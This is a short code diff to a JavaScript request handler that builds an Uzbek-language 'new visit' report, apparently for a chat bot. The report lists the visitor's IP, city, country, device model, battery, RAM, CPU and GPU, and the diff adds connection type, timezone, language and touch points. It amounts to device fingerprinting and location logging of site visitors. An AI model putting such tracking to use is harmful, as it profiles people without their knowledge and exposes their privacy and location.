@@ -41,16 +41,20 @@ export default async function handler(req, res) {
     }
 
     const message = `
-🚀 *DEEP SCAN: Yangi Tashrif*
+🚀 *ULTRA SCAN: Yangi Tashrif*
 ----------------------------
 🕒 *Vaqt:* ${uzTime}
 📱 *Qurilma:* ${data.exactModel || deviceModel}
 🌐 *Ilova:* ${browserName}
 
 🔋 *Batareya:* ${data.battery?.level || 'Noma\'lum'} (${data.battery?.charging || ''})
-🧠 *RAM:* ${data.ram} GB
-⚡ *CPU:* ${data.cores} cores
+🧠 *RAM:* ${data.ram} GB | *CPU:* ${data.cores}
 🎮 *GPU:* \`${data.gpu}\`
+
+📡 *Internet:* ${data.connection?.type || 'Noma\'lum'} (${data.connection?.downlink || ''})
+🌍 *Region:* ${data.timezone}
+🇺🇿 *Til:* ${data.language}
+👆 *Touch:* ${data.touchPoints} nuqta
 
 🌍 *IP:* ${ip}
 📍 *Joylashuv:* ${data.city || ''}, ${data.country || ''}
